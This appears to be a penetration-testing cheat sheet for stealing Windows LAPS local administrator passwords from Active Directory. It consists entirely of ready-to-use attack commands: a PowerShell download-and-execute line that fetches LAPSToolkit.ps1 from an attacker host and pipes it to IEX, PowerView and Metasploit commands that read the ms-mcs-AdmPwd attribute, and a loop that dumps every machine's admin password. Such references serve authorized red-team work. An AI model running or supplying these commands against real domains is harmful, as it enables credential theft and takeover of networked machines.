# LAPS

% laps, password

#plateform/windows  #target/remote #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## get laps passwords (powershell)
```
Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
```

## laps toolkit - download
https://github.com/leoloobeek/LAPSToolkit

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/LAPSToolkit.ps1') | IEX; Import-Module .\LAPSToolkit.ps1
```

## laps toolkit - Get laps computer and passwords
```powershell
Import-Module .\LAPSToolkit.ps1; Get-LAPSComputers
```

## laps toolkit - find LAPS Delegated Groups
```powershell
Import-Module .\LAPSToolkit.ps1; Find-LAPSDelegatedGroups
```

## laps toolkit - Find users with Extended rights
```powershell
Import-Module .\LAPSToolkit.ps1; Find-AdmPwdExtendedRights
```


##  get laps password (powerview)
```powershell
Get-DomainObject <computer> -Properties "ms-mcs-AdmPwd",name
```

##  get laps password (metasploit)
```
use windows/gather/credentials/enum_laps
```

## get all machine passwords (powershell)
```
foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
```




